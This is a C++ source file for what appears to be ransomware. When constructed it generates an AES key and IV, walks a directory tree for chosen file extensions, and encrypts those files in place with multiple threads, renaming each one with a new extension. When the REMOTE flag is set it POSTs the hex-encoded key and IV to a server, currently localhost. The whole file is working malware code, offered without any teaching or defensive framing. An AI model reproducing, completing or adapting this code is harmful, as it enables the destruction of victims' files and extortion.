#include "Crypter.h"

Crypter::Crypter()
{
    AutoSeededRandomPool prng;
    prng.GenerateBlock(_key, sizeof(_key));
    prng.GenerateBlock(_iv, sizeof(_iv));
    letsGO();
}

Crypter::Crypter(const string &key, const string &iv)
{
//    _key = Crypter::unbeautify(key);
//    _iv = Crypter::unbeautify(iv);
}

int Crypter::letsGO()
{
#if REMOTE
    thread remote_thread([this] {
        httplib::Client cli("localhost", 1234);
        httplib::Params params;

        params.emplace("key", beautifulKey());
        params.emplace("iv", beautifulIV());

        auto res = cli.Post("/", params);

        if (res && res->status == 200) {
            cout << "Remote response: " << endl;
            cout << res->body << endl;
        }
    });
#endif

    const vector<string> files = loadFiles();
    unsigned long last_file_index = files.size() - 1;

    vector<thread> threads(_THREAD_NUM);
    std::mutex mutex;

    for (unsigned i = 0; i < _THREAD_NUM; ++i) {
        threads[i] = thread([this, &mutex, i, files, &last_file_index] {
            while (true) {
                string _file;

                {
                    std::lock_guard<std::mutex> iolock(mutex);

                    if (last_file_index == _current_file_index) break;

                    ++_current_file_index;
                    _file = files[_current_file_index];
                }

                encrypt(_file);
            } // while
        }); // thread
    } // for

    for (auto &t : threads)
        t.join();

#if REMOTE
    remote_thread.join();
#endif

    cout << "Done :)" << endl;
    return 1;
}

int Crypter::encrypt(const string &file)
{
    fstream infile(file);
    if (!infile.is_open())
        return status::OPEN_ERR;

    try {
        CBC_Mode<AES>::Encryption e;
        e.SetKeyWithIV(_key, _KEY_LENGTH, _iv);

        string buffer(_BUFFER_SIZE, '\0'), cipher;

        while (infile) {
            infile.read(buffer.data(), _BUFFER_SIZE);

            StringSource s(buffer, true,
                           new StreamTransformationFilter(e,
                                                          new StringSink(cipher),
                                                          BlockPaddingSchemeDef::NO_PADDING
                           ) // StreamTransformationFilter
            ); // StringSource

            infile.seekp(infile.tellg() - _BUFFER_SIZE);
            infile.write(cipher.c_str(), _BUFFER_SIZE);
            cipher.clear();
        }
    }
    catch (const CryptoPP::Exception &e) {
        return status::FAILED;
    }

    if (rename(file.c_str(), (file + _EXTENSION).c_str()) != 0)
        return status::MOVE_ERR;

    return status::SUCCESS;
}

int Crypter::decrypt(const string &file)
{
    fstream encfile(file);
    if (!encfile.is_open())
        return status::OPEN_ERR;

    try {
        CBC_Mode<AES>::Decryption d;
        d.SetKeyWithIV(_key, _KEY_LENGTH, _iv);

        string buffer(_BUFFER_SIZE, '\0'), recovered;

        while (encfile) {
            encfile.read(buffer.data(), _BUFFER_SIZE);

            StringSource s(buffer, true,
                           new StreamTransformationFilter(d,
                                                          new StringSink(recovered),
                                                          BlockPaddingSchemeDef::NO_PADDING
                           ) // StreamTransformationFilter
            ); // StringSource

            encfile.seekp(encfile.tellg() - _BUFFER_SIZE);
            encfile.write(recovered.c_str(), _BUFFER_SIZE);
            recovered.clear();
        }
    }
    catch (const CryptoPP::Exception &e) {
        return status::FAILED;
    }

    if (rename(file.c_str(), file.substr(0, file.size() - _EXT_LENGTH).c_str()) != 0)
        return status::MOVE_ERR;

    return status::SUCCESS;
}

vector<string> Crypter::loadFiles()
{
    typedef fs::recursive_directory_iterator it;
    typedef fs::directory_options opt;

    std::vector<string> files;
    for (auto &p: it(_entry_dir, opt::skip_permission_denied)) {
        if (find(_extentions.begin(), _extentions.end(), p.path().extension()) == _extentions.end())
            continue;

        files.push_back(p.path());
    }

    return files;
}

string Crypter::beautifulKey()
{
    string raw;

    StringSource(_key, _KEY_LENGTH, true,
                 new HexEncoder(
                         new StringSink(raw)
                 ) // HexEncoder
    ); // StringSource

    return raw;
}

string Crypter::beautifulIV()
{
    string raw;

    StringSource(_iv, _BLOCK_SIZE, true,
                 new HexEncoder(
                         new StringSink(raw)
                 ) // HexEncoder
    ); // StringSource

    return raw;
}

string Crypter::unbeautify(const string &encoded)
{
    string decoded;

    StringSource ssk(encoded, true,
                     new HexDecoder(
                             new StringSink(decoded)
                     ) // HexDecoder
    ); // StringSource

    return decoded;
}